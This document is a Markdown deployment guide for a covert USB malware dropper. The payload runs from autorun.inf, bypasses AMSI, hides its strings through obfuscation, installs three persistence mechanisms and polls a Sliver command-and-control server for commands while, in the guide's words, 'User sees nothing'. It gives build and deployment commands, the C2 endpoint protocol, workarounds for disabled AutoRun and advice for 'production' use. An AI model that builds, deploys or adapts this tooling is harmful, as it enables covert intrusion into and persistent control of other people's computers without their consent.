# Deployment Guide (Phase 6)

## Quick Start

```bash
# Deploy obfuscated + compiled dropper to USB
chmod +x deploy-enhanced.sh
./deploy-enhanced.sh --usb /Volumes/USB_NAME --c2-url https://your-c2:8080 --obfuscate
```

## What's Deployed

On USB:
- `autorun.inf` - triggers on insert
- `payload.exe` - compiled dropper (obfuscated, C2 injected)

## Startup Sequence (on target)

```
1. USB inserted
2. Windows AutoRun reads autorun.inf
3. autorun.inf calls payload.exe
4. payload.exe executes (hidden window):
   a. AMSI bypass (Phase 1)
   b. Obfuscation decode (Phase 1)
   c. GET /health (Phase 2)
   d. POST /register (Phase 2) - negotiate key
   e. Install 3 persistence mechanisms (Phase 3)
   f. Loop: GET /command (Phase 2+3)
5. User sees nothing
6. Persistence active after reboot
```

## Options

| Option | Purpose |
|--------|---------|
| `--usb /path` | USB mount path (required) |
| `--c2-url http://...` | C2 server URL (required) |
| `--obfuscate` | Apply obfuscation (Phase 1) |
| `--sign` | Sign .exe with certificate (Phase 1) |

## C2 Server Setup

Before deployment, ensure C2 supports:
- `GET /health` - return 200 OK
- `POST /register?host=HOSTNAME` - return `{"key": "...", "method": "aes"}`
- `GET /command?host=HOSTNAME` - return encrypted payload or DELETE

See `C2_SERVER_REQUIREMENTS.md` for details.

## USB Preparation

Tested on:
- NTFS formatted USB (Windows)
- exFAT (both Windows/Mac)

Steps:
1. Format USB as exFAT
2. Run deploy script
3. Insert on target

## Sliver Integration

```bash
# Start Sliver listener
sliver > http -L 0.0.0.0 -p 8080

# Deploy dropper to USB
./deploy-enhanced.sh --usb /Volumes/USB --c2-url http://YOUR_IP:8080 --obfuscate

# Monitor for callback
sliver > sessions
# [DESKTOP-ABC123] connected from 192.168.1.100
```

## Troubleshooting

**autorun.inf not triggering:**
- Windows requires USB to have AutoRun.inf in root + payload executable
- Some Windows versions have AutoRun disabled (GPO)
- Workaround: manual execution or scheduled task

**C2 callback fails:**
- Check firewall rules (port 8080 open)
- Verify C2 URL in deployment (should see in /tmp/payload.exe)
- Check /health endpoint responds

**Obfuscation slow:**
- First run takes ~10-30s
- Subsequent runs cached (if using same input)

## Advanced

**Multi-target USB:**
```bash
# Each deployment customizes C2 URL
./deploy-enhanced.sh --usb /Volumes/USB --c2-url http://c2-1:8080
# (remove payload.exe)
./deploy-enhanced.sh --usb /Volumes/USB --c2-url http://c2-2:8080
# Result: USB has 2 executables, each with different C2
```

**Manual compilation (skip script):**
```bash
# Obfuscate
powershell -NoProfile -Command {
    . ./lib/obfuscation.ps1
    Obfuscate-PowerShellScript -ScriptPath ./lib/sliver-dropper-core.ps1
}

# Compile
python3 ./lib/ps2exe-wrapper.py ./lib/sliver-dropper-core.ps1 \
    -o payload.exe \
    --c2-url http://your-c2:8080 \
    --obfuscate

# Copy to USB
cp payload.exe /Volumes/USB/
cp usb-autorun.inf /Volumes/USB/autorun.inf
```

## Security Notes

- USB contains compiled binary (no source visible)
- C2 URL hardcoded in .exe
- Obfuscation hides suspicious strings
- AMSI bypass executes on target
- No authentication (assumes attacker controls network)

For production:
- Use HTTPS + certificate pinning
- Implement per-target keys
- Rotate deployment USB frequently
- Monitor C2 endpoints for indicators
